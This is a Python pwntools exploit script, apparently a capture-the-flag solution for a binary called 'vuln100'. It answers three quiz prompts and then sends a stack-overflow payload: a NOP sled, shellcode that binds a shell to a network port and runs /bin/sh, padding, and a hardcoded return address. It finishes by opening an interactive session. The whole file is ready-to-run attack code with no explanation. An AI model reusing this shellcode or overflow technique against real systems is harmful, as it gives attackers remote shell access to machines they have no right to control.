#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./vuln100"

rhp = {'host':"localhost",'port':0x1a0a} #port is hardcorded
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

buf2l8 = 0x108

shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

def exploit(conn):
  ans1 = "arsenal"
  ans2 = "gyeongbokgung"
  ans3 = "psy"

  #answer the quizes
  #(don't have to solve md5, just google the answer)
  conn.recvuntil("\x00")
  conn.sendline(ans1)
  conn.recvuntil("\x00")
  conn.sendline(ans2)
  conn.recvuntil("\x00")
  conn.sendline(ans3)

  #
  conn.recvuntil('\x00')
  #raw_input()
  #conn.sendline("A"*0x20)
  #conn.send("\x00")
  #conn.send("A"*(buf2l10-1))
  #print(hexdump(conn.recvrepeat()))
  #print("leaked rbp: "+hex(stack_addr))

  buf_top = 0x7ffdc42e4620
  payload = p8(0x90)*0x20 + shellcode
  payload += "A"*(buf2l8-len(payload))
  payload += p64(buf_top)
  payload += p64(buf_top)*5
  conn.sendline(payload)

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode child
      b *0x400cf8
      b *0x4011bb
      b *0x401219
      c
    """
    #0x400cf8: main
    #0x4011bb: call send
    #0x401219: 大事な関数呼ぶ直前
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

